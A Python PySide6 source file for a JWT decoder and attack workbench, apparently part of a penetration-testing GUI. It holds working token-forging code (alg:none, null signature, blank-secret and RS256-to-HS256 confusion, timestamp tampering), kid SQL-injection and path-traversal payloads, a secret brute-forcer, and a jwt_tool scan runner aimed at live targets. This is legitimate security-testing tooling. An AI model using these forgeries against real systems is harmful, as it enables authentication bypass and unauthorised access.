"""
JwtPage — Interactive JWT decoder and attack workbench.

Native attacks (pure stdlib):
  • alg:none           (CVE-2015-2951)
  • Null signature      (CVE-2020-28042)
  • Blank password      (CVE-2019-20933)
  • HS256 re-sign       (known/guessed secret)
  • RS256 → HS256 confusion
  • Timestamp tamper    (exp / nbf / iat manipulation)
  • kid SQL injection   (key-lookup SQLi)
  • kid path traversal  (../../dev/null + empty secret)
  • Wordlist brute-force (QThread)

Docker scan:
  • jwt_tool playbook / exploit scan against live endpoint
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import subprocess
import time
from pathlib import Path

from PySide6.QtCore import Qt, QThread, QTimer, Signal
from PySide6.QtGui import QFont
from PySide6.QtWidgets import (
    QApplication, QComboBox, QFileDialog, QFrame, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QScrollArea, QSplitter,
    QTextEdit, QVBoxLayout, QWidget,
)

from gui.utilities.syntax_highlighter import SyntaxHighlighter

log = logging.getLogger(__name__)

# ── styles ────────────────────────────────────────────────────────────────────

_BTN = (
    "QPushButton{background:#313244;color:#CDD6F4;border:1px solid #45475A;"
    "border-radius:4px;padding:0 10px;min-height:24px;font-size:9px;}"
    "QPushButton:hover{background:#45475A;}"
    "QPushButton:disabled{background:#181825;color:#45475A;border-color:#313244;}"
)
_BTN_ACCENT = (
    "QPushButton{background:#1A2E28;color:#94E2D5;border:1px solid #94E2D5;"
    "border-radius:4px;padding:0 10px;min-height:24px;font-size:9px;font-weight:bold;}"
    "QPushButton:hover{background:#253E36;}"
    "QPushButton:disabled{background:#181825;color:#45475A;border-color:#313244;}"
)
_BTN_ORANGE = (
    "QPushButton{background:#2E1E10;color:#FAB387;border:1px solid #FAB387;"
    "border-radius:4px;padding:0 14px;min-height:26px;font-size:10px;font-weight:bold;}"
    "QPushButton:hover{background:#3E2A18;}"
)
_BTN_RED = (
    "QPushButton{background:#2D1420;color:#F38BA8;border:1px solid #F38BA8;"
    "border-radius:4px;padding:0 10px;min-height:24px;font-size:9px;}"
    "QPushButton:hover{background:#3D1A2E;}"
    "QPushButton:disabled{background:#181825;color:#45475A;border-color:#313244;}"
)
_BTN_YELLOW = (
    "QPushButton{background:#2A2010;color:#F9E2AF;border:1px solid #F9E2AF;"
    "border-radius:4px;padding:0 10px;min-height:24px;font-size:9px;}"
    "QPushButton:hover{background:#3A3020;}"
)
_BTN_GREEN = (
    "QPushButton{background:#1E3A2F;color:#A6E3A1;border:1px solid #A6E3A1;"
    "border-radius:4px;padding:0 12px;min-height:26px;font-size:10px;font-weight:bold;}"
    "QPushButton:hover{background:#2A4A3F;}"
    "QPushButton:disabled{background:#181825;color:#45475A;border-color:#313244;}"
)
_LINE = (
    "QLineEdit{background:#11111B;color:#CDD6F4;border:1px solid #45475A;"
    "border-radius:4px;padding:3px 6px;font-size:9px;}"
    "QLineEdit:focus{border-color:#FAB387;}"
)
_COMBO = (
    "QComboBox{background:#11111B;color:#CDD6F4;border:1px solid #45475A;"
    "border-radius:4px;padding:0 6px;min-height:24px;font-size:9px;}"
    "QComboBox::drop-down{border:none;}"
    "QComboBox QAbstractItemView{background:#1E1E2E;color:#CDD6F4;"
    "selection-background-color:#313244;border:1px solid #45475A;}"
)


# ── JWT crypto helpers ────────────────────────────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    s = s.replace('-', '+').replace('_', '/')
    padding = 4 - len(s) % 4
    if padding != 4:
        s += '=' * padding
    return base64.b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()


def _parse_jwt(token: str):
    """Returns (header_dict, payload_dict, sig_hex, header_b64, payload_b64)."""
    token = token.strip()
    parts = token.split('.')
    if len(parts) < 2:
        return None, None, "", "", ""
    try:
        header      = json.loads(_b64url_decode(parts[0]).decode('utf-8', errors='replace'))
        payload_raw = _b64url_decode(parts[1])
        try:
            payload = json.loads(payload_raw.decode('utf-8', errors='replace'))
        except Exception:
            payload = {"_raw": payload_raw.hex()}
        sig_hex = _b64url_decode(parts[2]).hex() if len(parts) > 2 and parts[2] else ""
        return header, payload, sig_hex, parts[0], parts[1]
    except Exception as exc:
        log.debug("jwt parse: %s", exc)
        return None, None, "", "", ""


def _sign_hs256(h_b64: str, p_b64: str, secret: bytes) -> str:
    msg = f"{h_b64}.{p_b64}".encode()
    sig = hmac.new(secret, msg, hashlib.sha256).digest()
    return f"{h_b64}.{p_b64}.{_b64url_encode(sig)}"


def _rebuild_header(h_b64: str, overrides: dict) -> str:
    """Decode header b64, apply overrides dict, re-encode."""
    h = json.loads(_b64url_decode(h_b64).decode())
    h.update(overrides)
    return _b64url_encode(json.dumps(h, separators=(',', ':')).encode())


def _alg_none_attack(h_b64: str, p_b64: str) -> str:
    try:
        new_h = _rebuild_header(h_b64, {"alg": "none"})
        return f"{new_h}.{p_b64}."
    except Exception as exc:
        return f"Error: {exc}"


def _null_sig_attack(h_b64: str, p_b64: str) -> str:
    """CVE-2020-28042 — send null/zero bytes as signature (alg unchanged)."""
    null_sig = _b64url_encode(b'\x00' * 32)
    return f"{h_b64}.{p_b64}.{null_sig}"


def _blank_password_attack(h_b64: str, p_b64: str) -> str:
    """CVE-2019-20933 — sign with empty string as HMAC secret."""
    new_h = _rebuild_header(h_b64, {"alg": "HS256"})
    return _sign_hs256(new_h, p_b64, b"")


def _kid_attack(h_b64: str, p_b64: str, kid_value: str, secret: bytes) -> str:
    """Inject a custom kid into the header then sign with secret."""
    new_h = _rebuild_header(h_b64, {"alg": "HS256", "kid": kid_value})
    return _sign_hs256(new_h, p_b64, secret)


def _tamper_timestamps(payload_json: str, preset: str) -> str:
    """
    Modify exp/nbf/iat in the payload.
    preset: '+24h' | '+30d' | '+1yr' | 'max' | 'remove_exp' | 'remove_nbf' | 'now_iat'
    Returns updated JSON string.
    """
    try:
        obj = json.loads(payload_json)
    except Exception:
        return payload_json

    now = int(time.time())
    if preset == "+24h":
        obj["exp"] = now + 86_400
    elif preset == "+30d":
        obj["exp"] = now + 2_592_000
    elif preset == "+1yr":
        obj["exp"] = now + 31_536_000
    elif preset == "max":
        obj["exp"] = 9_999_999_999
    elif preset == "remove_exp":
        obj.pop("exp", None)
    elif preset == "remove_nbf":
        obj.pop("nbf", None)
    elif preset == "now_iat":
        obj["iat"] = now

    return json.dumps(obj, indent=2)


# ── Background workers ────────────────────────────────────────────────────────

class _BruteWorker(QThread):
    found    = Signal(str)
    progress = Signal(str)
    done     = Signal()

    def __init__(self, h_b64: str, p_b64: str, sig_b64: str,
                 wordlist: str, parent=None):
        super().__init__(parent)
        self._h    = h_b64
        self._p    = p_b64
        self._sig  = sig_b64
        self._path = wordlist
        self._stop = False

    def stop(self) -> None:
        self._stop = True

    def run(self) -> None:
        msg = f"{self._h}.{self._p}".encode()
        try:
            with open(self._path, errors='replace') as f:
                for i, line in enumerate(f):
                    if self._stop:
                        self.progress.emit("Stopped.")
                        break
                    secret = line.strip()
                    if not secret:
                        continue
                    candidate = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
                    if _b64url_encode(candidate) == self._sig:
                        self.found.emit(secret)
                        self.done.emit()
                        return
                    if i % 5000 == 0 and i:
                        self.progress.emit(f"Tried {i:,} candidates…")
        except Exception as exc:
            self.progress.emit(f"Error: {exc}")
        self.done.emit()


class _JwtToolWorker(QThread):
    """Runs `docker run ticarpi/jwt_tool ...` and streams output line by line."""
    output = Signal(str)
    done   = Signal()

    def __init__(self, args: list[str], parent=None):
        super().__init__(parent)
        self._args = args
        self._proc = None

    def stop(self) -> None:
        if self._proc:
            try:
                self._proc.terminate()
            except Exception:
                pass

    def run(self) -> None:
        try:
            self._proc = subprocess.Popen(
                self._args,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
            for line in self._proc.stdout:
                self.output.emit(line.rstrip())
            self._proc.wait()
        except FileNotFoundError:
            self.output.emit("[!] docker not found — is Docker installed and on PATH?")
        except Exception as exc:
            self.output.emit(f"[!] {exc}")
        finally:
            self.done.emit()


# ── JWT Page ──────────────────────────────────────────────────────────────────

class JwtPage(QWidget):
    """Interactive JWT decoder and attack workbench (nav index 14)."""

    send_to_repeater = Signal(str)

    def __init__(self, repository=None, parent=None):
        super().__init__(parent)
        self._repo         = repository
        self._token        = ""
        self._h_b64        = ""
        self._p_b64        = ""
        self._sig_b64      = ""
        self._wordlist     = ""
        self._brute:     _BruteWorker   | None = None
        self._jt_worker: _JwtToolWorker | None = None
        self._save_timer = None
        self._build_ui()
        self._save_timer = QTimer(self)
        self._save_timer.setSingleShot(True)
        self._save_timer.setInterval(1500)
        self._save_timer.timeout.connect(self._save_state)
        self._token_input.textChanged.connect(self._save_timer.start)
        self._pay_edit.textChanged.connect(self._save_timer.start)
        self._secret_in.textChanged.connect(self._save_timer.start)
        self._pubkey_in.textChanged.connect(self._save_timer.start)
        self._restore_state()

    # ── public API ────────────────────────────────────────────────────────────

    def load_token(self, token: str) -> None:
        self._token_input.setText(token.strip())
        self._parse()

    # ── UI ────────────────────────────────────────────────────────────────────

    def _build_ui(self) -> None:
        root = QVBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # Toolbar
        tb = QHBoxLayout()
        tb.setContentsMargins(8, 6, 8, 6)
        tb.setSpacing(6)

        title = QLabel("⚿  JWT Analyzer")
        title.setStyleSheet("color:#FAB387; font-size:11px; font-weight:bold;")
        tb.addWidget(title)

        self._token_input = QLineEdit()
        self._token_input.setPlaceholderText("Paste JWT token here…")
        self._token_input.setFont(QFont("Cascadia Code", 9))
        self._token_input.setStyleSheet(_LINE)
        self._token_input.returnPressed.connect(self._parse)
        tb.addWidget(self._token_input, stretch=1)

        for label, slot, ss in [
            ("Parse",       self._parse,        _BTN_ACCENT),
            ("Clear",       self._clear,        _BTN),
            ("Copy Output", self._copy_output,  _BTN),
        ]:
            btn = QPushButton(label)
            btn.setFixedHeight(26)
            btn.setStyleSheet(ss)
            btn.clicked.connect(slot)
            tb.addWidget(btn)

        root.addLayout(tb)
        root.addWidget(_hsep())

        # Main horizontal split: left (views) | right (attacks)
        main = QSplitter(Qt.Horizontal)
        main.setChildrenCollapsible(False)
        main.setStyleSheet("QSplitter::handle{background:#313244;width:3px;}")

        # ── Left: three vertical panes ────────────────────────────────────────
        left    = QWidget()
        left_vb = QVBoxLayout(left)
        left_vb.setContentsMargins(0, 0, 0, 0)
        left_vb.setSpacing(0)

        vert = QSplitter(Qt.Vertical)
        vert.setChildrenCollapsible(False)
        vert.setStyleSheet("QSplitter::handle{background:#313244;height:3px;}")

        self._hdr_pane, self._hdr_edit = self._make_pane("HEADER",    "#89B4FA", ro=True)
        self._pay_pane, self._pay_edit = self._make_pane("PAYLOAD",   "#A6E3A1", ro=False)
        self._sig_pane, self._sig_edit = self._make_pane("SIGNATURE", "#6C7086", ro=True)

        vert.addWidget(self._hdr_pane)
        vert.addWidget(self._pay_pane)
        vert.addWidget(self._sig_pane)
        vert.setSizes([130, 220, 60])
        left_vb.addWidget(vert)
        main.addWidget(left)

        # ── Right: scrollable attack panel ───────────────────────────────────
        main.addWidget(self._build_attack_panel())
        main.setSizes([520, 310])
        root.addWidget(main, stretch=1)

    def _build_attack_panel(self) -> QWidget:
        outer = QWidget()
        outer.setMinimumWidth(280)
        outer.setStyleSheet("background:#181825;")
        ol = QVBoxLayout(outer)
        ol.setContentsMargins(0, 0, 0, 0)
        ol.setSpacing(0)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QFrame.NoFrame)
        scroll.setStyleSheet(
            "QScrollArea{background:#181825;border:none;}"
            "QScrollBar:vertical{background:#181825;width:8px;}"
            "QScrollBar::handle:vertical{background:#45475A;border-radius:4px;}"
        )

        inner = QWidget()
        inner.setStyleSheet("background:#181825;")
        vb = QVBoxLayout(inner)
        vb.setContentsMargins(8, 8, 8, 4)
        vb.setSpacing(4)

        # ── alg:none ─────────────────────────────────────────────────────────
        vb.addWidget(self._sec_lbl("ATTACKS"))
        alg_btn = QPushButton("alg:none  (CVE-2015-2951)")
        alg_btn.setFixedHeight(28)
        alg_btn.setStyleSheet(_BTN_ORANGE)
        alg_btn.clicked.connect(self._do_alg_none)
        vb.addWidget(alg_btn)

        # ── Null signature ────────────────────────────────────────────────────
        vb.addWidget(self._sec_lbl("NULL SIGNATURE  CVE-2020-28042"))
        null_btn = QPushButton("Null Sig — zero-byte signature, alg unchanged")
        null_btn.setFixedHeight(26)
        null_btn.setStyleSheet(_BTN_RED)
        null_btn.clicked.connect(self._do_null_sig)
        vb.addWidget(null_btn)

        # ── Blank password ────────────────────────────────────────────────────
        vb.addWidget(self._sec_lbl("BLANK PASSWORD  CVE-2019-20933"))
        blank_btn = QPushButton('Blank Password — HS256 sign with secret=""')
        blank_btn.setFixedHeight(26)
        blank_btn.setStyleSheet(_BTN_RED)
        blank_btn.clicked.connect(self._do_blank_password)
        vb.addWidget(blank_btn)

        # ── HS256 re-sign ─────────────────────────────────────────────────────
        vb.addWidget(self._sec_lbl("SIGN HS256"))
        self._secret_in = QLineEdit()
        self._secret_in.setPlaceholderText("HMAC secret…")
        self._secret_in.setFont(QFont("Cascadia Code", 9))
        self._secret_in.setStyleSheet(_LINE)
        vb.addWidget(self._secret_in)
        hs_btn = QPushButton("Sign with Secret ▶")
        hs_btn.setFixedHeight(26)
        hs_btn.setStyleSheet(_BTN_ACCENT)
        hs_btn.clicked.connect(self._do_hs256)
        vb.addWidget(hs_btn)

        # ── RS256 → HS256 ─────────────────────────────────────────────────────
        vb.addWidget(self._sec_lbl("RS256 → HS256 CONFUSION"))
        self._pubkey_in = QTextEdit()
        self._pubkey_in.setPlaceholderText("Paste RSA public key PEM here…")
        self._pubkey_in.setMaximumHeight(70)
        self._pubkey_in.setFont(QFont("Cascadia Code", 8))
        self._pubkey_in.setStyleSheet(
            "QTextEdit{background:#11111B;color:#CDD6F4;border:1px solid #45475A;"
            "border-radius:4px;padding:4px;font-size:9px;}"
        )
        vb.addWidget(self._pubkey_in)
        rs_btn = QPushButton("RS256→HS256 ▶")
        rs_btn.setFixedHeight(26)
        rs_btn.setStyleSheet(_BTN_ACCENT)
        rs_btn.clicked.connect(self._do_rs256_hs256)
        vb.addWidget(rs_btn)

        # ── Timestamp tamper ──────────────────────────────────────────────────
        vb.addWidget(self._sec_lbl("TIMESTAMP TAMPER"))
        ts_lbl = QLabel("Set exp:")
        ts_lbl.setStyleSheet("color:#6C7086; font-size:9px;")
        vb.addWidget(ts_lbl)
        ts_row = QHBoxLayout()
        ts_row.setContentsMargins(0, 0, 0, 0)
        ts_row.setSpacing(4)
        for label, preset in [
            ("+24h", "+24h"), ("+30d", "+30d"), ("+1yr", "+1yr"), ("MAX", "max"),
        ]:
            b = QPushButton(label)
            b.setFixedHeight(24)
            b.setStyleSheet(_BTN_YELLOW)
            b.clicked.connect(lambda _=None, p=preset: self._do_timestamp(p))
            ts_row.addWidget(b)
        vb.addLayout(ts_row)

        ts_row2 = QHBoxLayout()
        ts_row2.setContentsMargins(0, 0, 0, 0)
        ts_row2.setSpacing(4)
        for label, preset in [
            ("Remove exp", "remove_exp"), ("Remove nbf", "remove_nbf"), ("iat=now", "now_iat"),
        ]:
            b = QPushButton(label)
            b.setFixedHeight(24)
            b.setStyleSheet(_BTN)
            b.clicked.connect(lambda _=None, p=preset: self._do_timestamp(p))
            ts_row2.addWidget(b)
        vb.addLayout(ts_row2)

        ts_note = QLabel("Edits payload above — re-sign afterwards with HS256 or alg:none.")
        ts_note.setStyleSheet("color:#45475A; font-size:8px;")
        ts_note.setWordWrap(True)
        vb.addWidget(ts_note)

        # ── kid attacks ───────────────────────────────────────────────────────
        vb.addWidget(self._sec_lbl("kid HEADER ATTACKS"))
        kid_lbl = QLabel("kid value (injected into header):")
        kid_lbl.setStyleSheet("color:#6C7086; font-size:9px;")
        vb.addWidget(kid_lbl)
        self._kid_in = QLineEdit("' OR 1=1--")
        self._kid_in.setFont(QFont("Cascadia Code", 9))
        self._kid_in.setStyleSheet(_LINE)
        vb.addWidget(self._kid_in)

        kid_secret_lbl = QLabel("Sign with secret (leave blank for empty string):")
        kid_secret_lbl.setStyleSheet("color:#6C7086; font-size:9px;")
        vb.addWidget(kid_secret_lbl)
        self._kid_secret_in = QLineEdit()
        self._kid_secret_in.setFont(QFont("Cascadia Code", 9))
        self._kid_secret_in.setStyleSheet(_LINE)
        self._kid_secret_in.setPlaceholderText("empty string if blank")
        vb.addWidget(self._kid_secret_in)

        kid_row = QHBoxLayout()
        kid_row.setContentsMargins(0, 0, 0, 0)
        kid_row.setSpacing(4)
        for label, slot in [
            ("SQL Inject",     self._do_kid_sqli),
            ("Path Traversal", self._do_kid_traversal),
            ("Custom kid",     self._do_kid_custom),
        ]:
            b = QPushButton(label)
            b.setFixedHeight(24)
            b.setStyleSheet(_BTN_ORANGE)
            b.clicked.connect(slot)
            kid_row.addWidget(b)
        vb.addLayout(kid_row)

        # ── Brute force ───────────────────────────────────────────────────────
        vb.addWidget(self._sec_lbl("BRUTE FORCE"))
        bf_wl = QHBoxLayout()
        self._wl_lbl = QLabel("No wordlist selected")
        self._wl_lbl.setStyleSheet("color:#6C7086; font-size:9px;")
        self._wl_lbl.setWordWrap(True)
        bf_wl.addWidget(self._wl_lbl, stretch=1)
        browse = QPushButton("Browse…")
        browse.setFixedHeight(22)
        browse.setStyleSheet(_BTN)
        browse.clicked.connect(self._browse_wl)
        bf_wl.addWidget(browse)
        vb.addLayout(bf_wl)

        bf_row = QHBoxLayout()
        self._brute_btn = QPushButton("▶ Start")
        self._brute_btn.setFixedHeight(26)
        self._brute_btn.setStyleSheet(_BTN_ACCENT)
        self._brute_btn.clicked.connect(self._start_brute)
        bf_row.addWidget(self._brute_btn, stretch=1)
        self._stop_btn = QPushButton("■ Stop")
        self._stop_btn.setFixedHeight(26)
        self._stop_btn.setEnabled(False)
        self._stop_btn.setStyleSheet(_BTN)
        self._stop_btn.clicked.connect(self._stop_brute)
        bf_row.addWidget(self._stop_btn)
        vb.addLayout(bf_row)

        # ── jwt_tool Docker scan ──────────────────────────────────────────────
        vb.addWidget(self._sec_lbl("JWT_TOOL SCAN  (Docker)"))

        jt_url_lbl = QLabel("Target URL (optional — omit for decode-only):")
        jt_url_lbl.setStyleSheet("color:#6C7086; font-size:9px;")
        vb.addWidget(jt_url_lbl)
        self._jt_url = QLineEdit()
        self._jt_url.setPlaceholderText("https://target.com/api/profile")
        self._jt_url.setStyleSheet(_LINE)
        vb.addWidget(self._jt_url)

        jt_inject_lbl = QLabel("Inject token via (when URL is set):")
        jt_inject_lbl.setStyleSheet("color:#6C7086; font-size:9px;")
        vb.addWidget(jt_inject_lbl)

        jt_cookie_row = QHBoxLayout()
        jt_cookie_row.setContentsMargins(0, 0, 0, 0)
        jt_cookie_row.setSpacing(4)
        jt_cookie_lbl = QLabel("Cookie name:")
        jt_cookie_lbl.setStyleSheet("color:#6C7086; font-size:9px;")
        jt_cookie_row.addWidget(jt_cookie_lbl)
        self._jt_cookie = QLineEdit("jwt")
        self._jt_cookie.setFixedWidth(90)
        self._jt_cookie.setStyleSheet(_LINE)
        jt_cookie_row.addWidget(self._jt_cookie)
        jt_hdr_lbl = QLabel("or Header:")
        jt_hdr_lbl.setStyleSheet("color:#6C7086; font-size:9px;")
        jt_cookie_row.addWidget(jt_hdr_lbl)
        self._jt_header = QLineEdit("Authorization: Bearer")
        self._jt_header.setStyleSheet(_LINE)
        jt_cookie_row.addWidget(self._jt_header, stretch=1)
        vb.addLayout(jt_cookie_row)

        jt_mode_row = QHBoxLayout()
        jt_mode_row.setContentsMargins(0, 0, 0, 0)
        jt_mode_row.setSpacing(4)
        jt_mode_lbl = QLabel("Mode:")
        jt_mode_lbl.setStyleSheet("color:#6C7086; font-size:9px;")
        jt_mode_row.addWidget(jt_mode_lbl)
        self._jt_mode = QComboBox()
        self._jt_mode.addItems([
            "decode only",
            "pb — Playbook scan",
            "at — All tests",
            "er — Error responses",
            "as — Alg switch",
            "rs — RS/HS switch",
            "ki — Key injection",
        ])
        self._jt_mode.setStyleSheet(_COMBO)
        jt_mode_row.addWidget(self._jt_mode, stretch=1)
        vb.addLayout(jt_mode_row)

        jt_btn_row = QHBoxLayout()
        jt_btn_row.setContentsMargins(0, 0, 0, 0)
        jt_btn_row.setSpacing(4)
        self._jt_run_btn = QPushButton("▶  Run jwt_tool")
        self._jt_run_btn.setFixedHeight(28)
        self._jt_run_btn.setStyleSheet(_BTN_GREEN)
        self._jt_run_btn.clicked.connect(self._run_jwt_tool)
        jt_btn_row.addWidget(self._jt_run_btn)
        self._jt_stop_btn = QPushButton("■  Stop")
        self._jt_stop_btn.setFixedHeight(28)
        self._jt_stop_btn.setEnabled(False)
        self._jt_stop_btn.setStyleSheet(_BTN_RED)
        self._jt_stop_btn.clicked.connect(self._stop_jwt_tool)
        jt_btn_row.addWidget(self._jt_stop_btn)
        vb.addLayout(jt_btn_row)

        jt_note = QLabel(
            "Uses ticarpi/jwt_tool Docker image. Requires Docker on PATH.\n"
            "Proxy not applied — runs direct to target."
        )
        jt_note.setStyleSheet("color:#45475A; font-size:8px;")
        jt_note.setWordWrap(True)
        vb.addWidget(jt_note)

        # ── Output ────────────────────────────────────────────────────────────
        vb.addWidget(self._sec_lbl("OUTPUT"))
        self._output = QTextEdit()
        self._output.setReadOnly(True)
        self._output.setFont(QFont("Cascadia Code", 8))
        self._output.setStyleSheet(
            "QTextEdit{background:#11111B;color:#CDD6F4;border:none;padding:6px;}"
        )
        self._output.setFixedHeight(180)
        vb.addWidget(self._output)

        # Copy-token bar
        tok_row = QHBoxLayout()
        tok_lbl = QLabel("Last token:")
        tok_lbl.setStyleSheet("color:#6C7086; font-size:8px;")
        tok_row.addWidget(tok_lbl)
        self._token_out = QLineEdit()
        self._token_out.setReadOnly(True)
        self._token_out.setPlaceholderText("run an attack to generate a token…")
        self._token_out.setStyleSheet(
            "QLineEdit{background:#11111B;color:#A6E3A1;border:1px solid #313244;"
            "border-radius:3px;padding:0 6px;font-size:8px;font-family:'Cascadia Code';}"
        )
        tok_row.addWidget(self._token_out, stretch=1)
        copy_tok_btn = QPushButton("Copy")
        copy_tok_btn.setFixedHeight(24)
        copy_tok_btn.setFixedWidth(48)
        copy_tok_btn.setStyleSheet(_BTN_ACCENT)
        copy_tok_btn.clicked.connect(self._copy_token)
        tok_row.addWidget(copy_tok_btn)
        vb.addLayout(tok_row)

        vb.addStretch()
        scroll.setWidget(inner)
        ol.addWidget(scroll, stretch=1)
        return outer

    # ── widget helpers ────────────────────────────────────────────────────────

    def _sec_lbl(self, text: str) -> QLabel:
        lbl = QLabel(text)
        lbl.setStyleSheet(
            "color:#6C7086; font-size:8px; letter-spacing:1.5px;"
            "border-bottom:1px solid #313244; padding-bottom:2px; margin-top:4px;"
        )
        return lbl

    def _make_pane(self, label: str, accent: str, ro: bool):
        wrapper = QWidget()
        wrapper.setStyleSheet("background:#11111B;")
        vb = QVBoxLayout(wrapper)
        vb.setContentsMargins(0, 0, 0, 0)
        vb.setSpacing(0)

        hdr_w = QWidget()
        hdr_w.setFixedHeight(22)
        hdr_w.setStyleSheet("background:#181825; border-bottom:1px solid #313244;")
        hdr_row = QHBoxLayout(hdr_w)
        hdr_row.setContentsMargins(8, 0, 8, 0)
        lbl = QLabel(label)
        lbl.setStyleSheet(
            f"color:{accent}; font-size:9px; font-weight:bold; background:transparent;"
        )
        hdr_row.addWidget(lbl)
        hdr_row.addStretch()
        vb.addWidget(hdr_w)

        edit = QTextEdit()
        edit.setReadOnly(ro)
        edit.setFont(QFont("Cascadia Code", 9))
        edit.setStyleSheet(
            "QTextEdit{background:#11111B;color:#CDD6F4;border:none;padding:8px;}"
        )
        SyntaxHighlighter(edit.document())
        vb.addWidget(edit)
        return wrapper, edit

    # ── persistence ───────────────────────────────────────────────────────────

    def _save_state(self) -> None:
        if not self._repo:
            return
        try:
            self._repo.save_page_state("jwt", {
                "token":    self._token_input.text(),
                "payload":  self._pay_edit.toPlainText(),
                "secret":   self._secret_in.text(),
                "pubkey":   self._pubkey_in.toPlainText(),
                "wordlist": self._wordlist,
            })
        except Exception:
            pass

    def _restore_state(self) -> None:
        if not self._repo:
            return
        try:
            state = self._repo.load_page_state("jwt")
        except Exception:
            return
        if not state:
            return
        token = state.get("token", "")
        if token:
            self._token_input.setText(token)
            self._parse()
            saved_payload = state.get("payload", "")
            if saved_payload and saved_payload != self._pay_edit.toPlainText():
                self._pay_edit.setPlainText(saved_payload)
        if state.get("secret"):
            self._secret_in.setText(state["secret"])
        if state.get("pubkey"):
            self._pubkey_in.setPlainText(state["pubkey"])
        if state.get("wordlist"):
            self._wordlist = state["wordlist"]
            self._wl_lbl.setText(Path(self._wordlist).name)

    # ── internal helpers ──────────────────────────────────────────────────────

    def _log(self, msg: str) -> None:
        self._output.append(msg)

    def _require_parsed(self) -> bool:
        if not self._h_b64:
            self._log("Parse a JWT token first.")
            return False
        return True

    def _set_result_token(self, token: str) -> None:
        self._token_out.setText(token)
        self._token_out.setCursorPosition(0)

    def _copy_token(self) -> None:
        tok = self._token_out.text()
        if tok:
            QApplication.clipboard().setText(tok)

    def _copy_output(self) -> None:
        txt = self._output.toPlainText()
        if txt:
            QApplication.clipboard().setText(txt)

    def _current_payload_b64(self) -> str:
        raw = self._pay_edit.toPlainText().strip()
        try:
            obj = json.loads(raw)
            return _b64url_encode(json.dumps(obj, separators=(',', ':')).encode())
        except Exception:
            return _b64url_encode(raw.encode())

    # ── parse / clear ─────────────────────────────────────────────────────────

    def _parse(self) -> None:
        token = self._token_input.text().strip()
        if not token:
            return
        self._token = token
        header, payload, sig_hex, h_b64, p_b64 = _parse_jwt(token)
        if header is None:
            self._log("Error: not a valid JWT (expected header.payload.signature).")
            return
        self._h_b64   = h_b64
        self._p_b64   = p_b64
        parts         = token.split('.')
        self._sig_b64 = parts[2] if len(parts) > 2 else ""
        self._hdr_edit.setPlainText(json.dumps(header, indent=2))
        self._pay_edit.setPlainText(json.dumps(payload, indent=2))
        self._sig_edit.setPlainText(sig_hex)
        self._log(
            f"Parsed | alg={header.get('alg','?')} | "
            f"{'signed' if self._sig_b64 else 'unsigned'}"
        )

    def _clear(self) -> None:
        self._token_input.clear()
        for edit in (self._hdr_edit, self._pay_edit, self._sig_edit, self._output):
            edit.clear()
        self._token_out.clear()
        self._token = self._h_b64 = self._p_b64 = self._sig_b64 = ""

    # ── attacks ───────────────────────────────────────────────────────────────

    def _do_alg_none(self) -> None:
        if not self._require_parsed():
            return
        result = _alg_none_attack(self._h_b64, self._current_payload_b64())
        self._set_result_token(result)
        self._log(
            f"\n[alg:none  CVE-2015-2951]\n"
            f"alg set to 'none', signature stripped:\n{result}\n"
            "→ Paste into Authorization: Bearer. If accepted, "
            "signature verification is not enforced."
        )

    def _do_null_sig(self) -> None:
        if not self._require_parsed():
            return
        result = _null_sig_attack(self._h_b64, self._current_payload_b64())
        self._set_result_token(result)
        self._log(
            f"\n[Null Signature  CVE-2020-28042]\n"
            f"Signature replaced with 32 null bytes (alg unchanged):\n{result}\n"
            "→ Some libraries skip verification when they see a null/zero signature."
        )

    def _do_blank_password(self) -> None:
        if not self._require_parsed():
            return
        result = _blank_password_attack(self._h_b64, self._current_payload_b64())
        self._set_result_token(result)
        self._log(
            f"\n[Blank Password  CVE-2019-20933]\n"
            f"HS256 signed with empty string as secret:\n{result}\n"
            "→ Some libraries accept tokens signed with an empty HMAC secret."
        )

    def _do_hs256(self) -> None:
        if not self._require_parsed():
            return
        secret = self._secret_in.text()
        if not secret:
            self._log("Enter an HMAC secret first.")
            return
        p_b64  = self._current_payload_b64()
        h_b64  = _rebuild_header(self._h_b64, {"alg": "HS256"})
        result = _sign_hs256(h_b64, p_b64, secret.encode())
        self._set_result_token(result)
        self._log(
            f"\n[HS256 re-sign — secret: {secret!r}]\n"
            f"Signed JWT:\n{result}\n"
            "→ Payload claims preserved — edit the PAYLOAD pane before signing."
        )

    def _do_rs256_hs256(self) -> None:
        if not self._require_parsed():
            return
        pubkey = self._pubkey_in.toPlainText().strip()
        if not pubkey:
            self._log("Paste the server RSA public key PEM first.")
            return
        p_b64  = self._current_payload_b64()
        h_b64  = _rebuild_header(self._h_b64, {"alg": "HS256"})
        result = _sign_hs256(h_b64, p_b64, pubkey.encode())
        self._set_result_token(result)
        self._log(
            f"\n[RS256→HS256 key confusion]\n"
            f"JWT signed with RSA public key as HMAC secret:\n{result}\n"
            "→ If the server uses the public key as HS256 secret, this token verifies."
        )

    def _do_timestamp(self, preset: str) -> None:
        if not self._require_parsed():
            return
        updated = _tamper_timestamps(self._pay_edit.toPlainText(), preset)
        self._pay_edit.setPlainText(updated)
        self._log(f"\n[Timestamp tamper — {preset}]\nPayload updated. Re-sign to forge a token.")

    def _do_kid_sqli(self) -> None:
        if not self._require_parsed():
            return
        kid     = "' OR 1=1--"
        self._kid_in.setText(kid)
        secret  = self._kid_secret_in.text().encode()
        result  = _kid_attack(self._h_b64, self._current_payload_b64(), kid, secret)
        self._set_result_token(result)
        self._log(
            f"\n[kid SQL injection]\n"
            f"kid set to: {kid!r}\n"
            f"Signed with: {secret!r}\n{result}\n"
            "→ If kid is used raw in a SQL query, this may bypass key lookup."
        )

    def _do_kid_traversal(self) -> None:
        if not self._require_parsed():
            return
        kid    = "../../dev/null"
        self._kid_in.setText(kid)
        result = _kid_attack(self._h_b64, self._current_payload_b64(), kid, b"")
        self._set_result_token(result)
        self._log(
            f"\n[kid Path Traversal]\n"
            f"kid set to: {kid!r}  (reads /dev/null → empty content)\n"
            f"Signed with empty string:\n{result}\n"
            "→ If kid is used as a file path to read the key, empty file = empty secret."
        )

